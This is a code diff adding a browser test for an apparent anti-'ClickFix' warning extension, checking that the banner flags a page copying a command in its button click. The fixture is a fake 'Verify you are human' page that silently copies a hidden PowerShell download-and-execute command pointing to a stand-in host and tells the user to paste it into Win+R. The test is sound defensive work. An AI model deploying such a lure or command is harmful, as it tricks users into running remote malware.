@@ -59,6 +59,44 @@ test('SCN-008 — the warning arrives before the user can click the fake control
   )
 })
 
+test('SCN-008 — a copy the page makes in its own button click is named as the page\'s (B-191)', async ({
+  context,
+}) => {
+  // The instructions arrive only after the click, so nothing is shown before it. Chromium
+  // sends the execCommand copy in the click handler as trusted; read as the person's own,
+  // the warning said "Nothing has been copied yet" with the command already on the clipboard.
+  await serve(
+    context,
+    `<!doctype html><html><body>
+       <h1>Verify you are human</h1>
+       <button id="verify">I am not a robot</button>
+       <script>
+         document.getElementById('verify').addEventListener('click', () => {
+           const area = document.createElement('textarea')
+           area.value = 'powershell -w hidden -c "iex(irm http://payload.test/a)"'
+           document.body.append(area)
+           area.select()
+           document.execCommand('copy')
+           area.remove()
+           const steps = document.createElement('p')
+           steps.textContent = 'Press Win + R, then Ctrl + V, then press Enter to complete verification.'
+           document.body.append(steps)
+         })
+       </script>
+     </body></html>`,
+  )
+  const page = await context.newPage()
+  await page.goto('https://fixture.test/verify')
+  await expectSettled(page, SETTLED.trap)
+  await page.locator('#verify').click()
+
+  await expectBanner(page, context)
+  await expect(page.locator('okolos-banner [data-role=headline]')).toContainText(
+    'This page copied a command',
+  )
+  await expect(page.locator('okolos-banner [data-role=detail]')).toContainText('powershell')
+})
+
 test('SCN-008 — an ordinary page that copies for you is not accused', async ({ context }) => {
   await serve(
     context,
